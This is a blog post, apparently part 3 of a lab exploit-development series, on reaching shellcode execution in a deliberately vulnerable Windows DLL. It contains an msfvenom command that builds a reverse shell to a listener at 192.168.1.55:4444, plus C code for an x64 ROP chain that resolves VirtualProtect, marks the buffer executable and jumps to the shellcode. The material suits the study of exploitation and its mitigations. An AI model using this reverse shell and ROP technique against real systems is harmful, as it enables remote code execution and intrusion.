[Home](https://plackyhacker.github.io) : [Part 1](https://plackyhacker.github.io/binary/all-the-leaks) : [Part 2](https://plackyhacker.github.io/binary/controlling-the-stack) : Part 3

# Shellcode Execution

In this blog post I will be exploring getting shellcode execution in my vulnerable DLL.

## Introduction

This series of posts has started to grow arms and legs. I have so many ideas where I can take this. This is good because I am learning lots of new techniques. It also bad because I don't seem to have enough time to write about it all! In this post I will be using the vulnerable functions in the DLL to allocate a shellcode buffer on the stack, write a ROP chain using the arbitrary write primitive, I will demonstrate how to resolve `VirtualProtect` using a ROP chain and the IAT. After this I will call `VirtualProtect` on the shellcode buffer and execute it.

## Allocating a Shellcode Buffer

First we can create a reverse shell shellcode using `msfvenom`:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.55 LPORT=4444 -v shellcode -b 0x00 -f c
```

This code is placed in the exploit:

```c
 unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        // omitted for brevity
```

We can use the `VulnDLL` `GlobalAllocate` function to allocate a large chunk on the heap and then we can read the address of it using the arbitrary read against the global variable (this was demonstrated in the last post):

```c
printf("Allocating a heap buffer for the shellcode...\n");
LPVOID shellcodeAlloc = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
memset(shellcodeAlloc, 0x90, 0x1000);

// copy shellcode into the buffer
memcpy((char*)(shellcodeAlloc) + 0x10, shellcode, sizeof(shellcode));

// allocate using the VulnDLL general buffer
GlobalAllocate(shellcodeAlloc, 0x1000);

// get the address of the buffer using the read primitive - offset found using IDA
LONGLONG shellcodeBufferAddr = ArbitraryRead(dllBase + 0x04650);
printf("shellcodeBufferAddr: 0x%p\n", (void*)shellcodeBufferAddr);
```

This is fairly straightforward. We create a buffer, fill it with nops (`0x90`), then use the DLL function to allocate it, and finally read the address of the buffer.

Why not just allocate memory on the heap and use the returned address in our exploit? Remember, we are simulating a remote exploit, the DLL is loaded in to the process for convenience but the techniques used are similar to those against a remote binary. If we allocate a buffer in our exploit process then a remote binary will not be able to access it.

Testing this in `WinDbg` shows the shellcode allocated to the address leaked using the arbitrary read:

<img width="1203" alt="Screenshot 2025-01-27 at 08 59 37" src="https://github.com/user-attachments/assets/a656c579-5ec3-40e3-a826-1ad90027e484" style="border: 1px solid black;" />

We have a shellcode buffer, and a reference to it.

**Note:** I could have looked for a code cave within the binary or another module and write the shellcode to it using the arbitrary write, I might look at that another time and examine what mitigations might prevent this.

## Arbitrarily Writing a ROP Chain

I am using a different approach to what I used in the last post to write the ROP chain, I am going to use the arbitrary write. Not only is this a technique that we sometimes rely upon but I also have a valid reason for doing this: I would like to know the address of the allocated buffer as I am going to write a string to it for use in the `GetProcAddress` call:

```c
// allocate to the general buffer for our rop chian ----------------------------------------------
printf("Allocating a heap buffer for the ROP chain...\n");
LPVOID globalAlloc = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);

// allocate the memory for the general buffer
memset(globalAlloc, 0x44, 0x1000);

GlobalAllocate(globalAlloc, 0x1000);

// get the address of the buffer using the read primitive - offset found using IDA
LONGLONG generalBufferAddr = ArbitraryRead(dllBase + 0x04650);
printf("generalBufferAddr: 0x%p\n", (void*)generalBufferAddr);
```

My first task on the ROP chain is to resolve the address of `VirtualProtect`. Now, I could easily read this from the IAT, but I have decided to demonstrate a different technique; calling the Win32 API to resolve it. First I write the sring at an offset to the general buffer:

```c
// write our string to the general buffer at an offset of 0x500
// VirtualProtect
ArbitraryWrite(generalBufferAddr + 0x500, 0x506c617574726956);              // VirtualP
ArbitraryWrite(generalBufferAddr + 0x508, 0x746365746f72);                  // rotect
```

I will reference this string in the `GetProcAddress` call.

## GetProcAddress

We will start by getting the address of `GetProcAddress` from the IAT of the vulnerable DLL. As this is the target 'binary' this is very unlikely to change, unless I add more functionality and recompile the application (but you should understand if you are targetting a specific version of an application the IAT offsets are not going to change).

Now, the OS might change and in part 1 I resolved `NTDLL` using the IAT in `kernel32`. I might revisit this later and use a different technique, but for now this will do.

```c
// GetProcAddress IAT offset 0x03020 - found using IDA
LONGLONG GetProcAddressAddr = ArbitraryRead((LONGLONG)dllBase + 0x03020);
printf("GetProcAddressAddr: 0x%p\n", (void*)GetProcAddressAddr);
```

Now we have the address of `GetProcAddress` we can start building a ROP chain on the buffer that will be pivoted to:

```c
// use the arbitrary write to build the rop chain in the general buffer
LONGLONG index = 0;

// GetProcAddress
ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x9215b); index += 8;         // pop rcx ; ret ;
ArbitraryWrite(generalBufferAddr + index, kernel32Base); index += 8;                // hModule
ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x8fb17); index += 8;         // pop rdx ; pop r11 ; ret ;
ArbitraryWrite(generalBufferAddr + index, generalBufferAddr + 0x500); index += 8;   // lpProcName
ArbitraryWrite(generalBufferAddr + index, 0x4141414141414141); index += 8;          // Junk in r11
ArbitraryWrite(generalBufferAddr + index, GetProcAddressAddr); index += 8;          // GetProcAddressStub address, will be called 
ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x84ab8); index += 8;         // add rsp, 0x20; pop r15; ret;
ArbitraryWrite(generalBufferAddr + index, 0x4141414141414141); index += 0x28;       // Junk in r15 and Shadow Space    
                                                                                    // rax now contains the address of VirtualProtect

ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0xa3060); index += 8;         // int3 ; ret ; (debug)
```

Using the `__fastcall` calling convention we assign the arguments to `rcx` and `rdx` (there are only two). Several things we should note are that `lpProcName` points to the string we wrote to the offset of `0x500`, `hModule` uses the base address of `kernel32` we resolved earlier, and we need to recover the stack using an `add rsp, 0x20` gadget after the call is completed (read about `x64` calling conventions if you are interested why).

At the end of the call the address of `VirtualProtect` should be in `rax`. I always add an `int3` gadget in a ROP chain when I want to debug 'things', always remembering to remove it when moving on to the next task:

<img width="1090" alt="Screenshot 2025-01-27 at 09 17 35" src="https://github.com/user-attachments/assets/3742d1ed-0b80-4189-b8ae-166afc5ae882" style="border: 1px solid black;" />

Perfect, the address is in `rax`, next we can call it in our ROP chain.

## VirtualProtect

We need to set the shellcode memory allocation to `PAGE_EXECUTE_READWRITE`, this is so our shellcode can be executed. This chain is a little bit longer, but only because `VirtualProtect` takes four arguments:

```c
// VirtualProtect
ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x9215b); index += 8;         // pop rcx ; ret ;
ArbitraryWrite(generalBufferAddr + index, shellcodeBufferAddr); index += 8;         // lpAddress
ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x8fb17); index += 8;         // pop rdx ; pop r11 ; ret ;
ArbitraryWrite(generalBufferAddr + index, 0x1000); index += 8;                      // dwSize
ArbitraryWrite(generalBufferAddr + index, 0x4141414141414141); index += 8;          // Junk in r11
ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x20107); index += 8;         // pop r8; ret;
ArbitraryWrite(generalBufferAddr + index, 0x40); index += 8;                        // flNewProtect (PAGE_EXECUTE_READWRITE)
ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x8fb14); index += 8;         // pop r9; pop r10; pop r11; ret;
ArbitraryWrite(generalBufferAddr + index, generalBufferAddr + 0x550); index += 8;   // flOldProtect
ArbitraryWrite(generalBufferAddr + index, 0x4141414141414141); index += 8;          // Junk in r10
ArbitraryWrite(generalBufferAddr + index, 0x4141414141414141); index += 8;          // Junk in r11
ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0xa33ac); index += 8;         // push rax; ret; (VirtualProtect will be called)
ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x84ab8); index += 8;         // add rsp, 0x20; pop r15; ret;
ArbitraryWrite(generalBufferAddr + index, 0x4141414141414141); index += 0x28;       // Junk in r15 and Shadow Space

ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0xa3060); index += 8;         // int3 ; ret ; (debug)
```

We move the address of the shellcode buffer into `rcx` (`lpAddress`). We move `0x1000` into `rdx` (`dwSize`). `r8` is the `flNewProtect` argument, so we pass in `0x40` (`PAGE_EXECUTE_READWRITE`), and finally we just pass in a writeable location on the general buffer we allocated into `r9` (`flOldProtect`).

We push `rax` onto the stack (the address of `VirtualProtect`) which means it will be called. When the function returns we reallign the stack as we did before. Finally, we can place an `int3` gadget for debugging. When debugging I examined the shellcode memory protections before the call:

<img width="1213" alt="Screenshot 2025-01-27 at 09 37 03" src="https://github.com/user-attachments/assets/791c6a53-6724-40d4-9509-0f523e4696a6" style="border: 1px solid black;" />

I also examined the protections after the call:

<img width="1209" alt="Screenshot 2025-01-27 at 09 37 29" src="https://github.com/user-attachments/assets/e92b8470-99f7-4297-bb20-cf6fcb5834cc" style="border: 1px solid black;" />

All that is left to do is execute the shellcode by placing the buffer address next on the stack.

```c
// shellcode
ArbitraryWrite(generalBufferAddr + index, shellcodeBufferAddr); index += 8;  // shellcode address
```

Let's go!

## Testing the Exploit

After testing in the debugger, I do a full test outside of `WinDbg` and the reults are wonderful:

<img width="1174" alt="Screenshot 2025-01-27 at 09 40 11" src="https://github.com/user-attachments/assets/335b9b32-6254-416e-8718-9ca8c191c8e6" style="border: 1px solid black;" />

## What Next?

Although we have shellcode execution, when we exit the shellcode the binary crashes, and while the shellcode is running the binary does not continue to function. This is fine in my little lab and is fine to proof-of-concept vulnerabilities but using these techniques against an operational system alone is going to crash it. I really want to start exploring Windows mitigations, but I also want the exploit in a finished state before I move on. I need time to think!

Goodbye!

[Home](https://plackyhacker.github.io) : [Part 1](https://plackyhacker.github.io/binary/all-the-leaks) : [Part 2](https://plackyhacker.github.io/binary/controlling-the-stack) : Part 3
